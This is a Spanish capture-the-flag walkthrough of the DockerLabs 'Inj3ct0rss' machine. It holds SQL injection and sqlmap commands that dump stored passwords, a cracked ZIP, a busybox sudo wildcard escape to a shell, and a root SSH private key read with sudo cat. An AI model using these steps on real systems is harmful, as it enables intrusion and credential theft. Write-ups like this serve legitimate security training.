#MAQUINA #DOCKERLABS #MEDIO 
#SQLI #SQLMAP
<hr>

# RECONOCIMIENTO

Vamos a resolver **Inj3ct0rss** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 07:57 CET
Initiating ARP Ping Scan at 07:57
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 07:57, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 07:57
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 07:57, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-27 07:57:15 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 07:59 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fd:f8:90:30:73:b2:51:20:2d:cb:7a:77:67:69:dc:e5 (ECDSA)
|_  256 ad:54:3f:1a:45:7c:b5:97:fb:5b:a8:fb:63:1d:1d:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Inj3ct0rs CTF - P\xC3\xA1gina Principal
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 07:59 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.0000050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /login.php: Possible admin folder
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Usamos **gobuster** :

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,html,php,js,txt,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 4025]
/login.php            (Status: 200) [Size: 1039]
/register.php         (Status: 200) [Size: 1053]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================



```

# EXPLOTACION

En el **login.php** :

Si metemos un `s' or 1=1 -- -` , vemos que es vulnerable a un **SQLI**.

Vamos a usar **sqlmap** :

```bash
sqlmap -u "http://172.17.0.2/login.php" --batch --forms --dbs
available databases [5]:
[*] information_schema
[*] injectors_db
[*] mysql
[*] performance_schema
[*] sys

sqlmap -u "http://172.17.0.2/login.php" --batch --forms -D injectors_db --tables 
Database: injectors_db
[1 table]
+-------+
| users |
+-------+

sqlmap -u "http://172.17.0.2/login.php" --batch --forms -D injectors_db -T users --dump
Database: injectors_db
Table: users
[5 entries]
+----+-----------------------------+----------+
| id | password                    | username |
+----+-----------------------------+----------+
| 1  | loveyou                     | root     |
| 2  | chicago123                  | jane     |
| 3  | password                    | admin    |
| 4  | no_mirar_en_este_directorio | ralf     |
| 5  | a                           | a        |
+----+-----------------------------+----------+

```

Miramos en :

```bash
http://172.17.0.2/no_mirar_en_este_directorio/
```

Cogemos el contenido :

```
wget http://172.17.0.2/no_mirar_en_este_directorio/secret.zip

secret.zip > x 
ver 2.0 efh 5455 efh 7875 secret.zip/confidencial.txt PKZIP Encr: TS_chk, cmplen=132, decmplen=177, crc=D2FD3E9E ts=7A38 cs=7a38 type=8

john x
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
computer         (secret.zip/confidencial.txt)     
1g 0:00:00:00 DONE 2/3 (2025-03-27 08:23) 50.00g/s 3093Kp/s 3093Kc/s 3093KC/s 123456..MATT
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

cat confidencial.txt 

You have to change your password ralf, I have told you many times, log into your account and I will change your password.

Your new credentials are:

ralf:supersecurepassword

```

YA ESTAMOS COMO RALF.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:

   ```bash
ralf@50bfb3b4954d:~$ sudo -l
Matching Defaults entries for ralf on 50bfb3b4954d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ralf may run the following commands on 50bfb3b4954d:
    (capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*

```

Vemos **busybox** con permisos SUDO en nothing( no podemos escribir), pero hay un wildcard :

```bash

ralf@50bfb3b4954d:/tmp$ sudo -u capa /usr/local/bin/busybox /nothing/../../bin/sh


BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/tmp $ whoami
capa
/tmp $ 

```

YA ESTAMOS COMO CAPA.

Vemos si el usuario tiene permisos SUDO:

```bash

/tmp $ sudo -l
Matching Defaults entries for capa on 50bfb3b4954d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User capa may run the following commands on 50bfb3b4954d:
    (ALL : ALL) NOPASSWD: /bin/cat


```

Vemos **cat** con permisos SUDO y root tiene su clave ssh en su directorio personal:

```bash

sudo /bin/cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

```bash

chmod 600 id_rsa

ssh root@172.17.0.2 -i id_rsa
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.13-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Aug 14 17:57:47 2024 from 172.19.0.1
root@50bfb3b4954d:~# whoami
root

```

**YA ESTAMOS COMO ROOT.**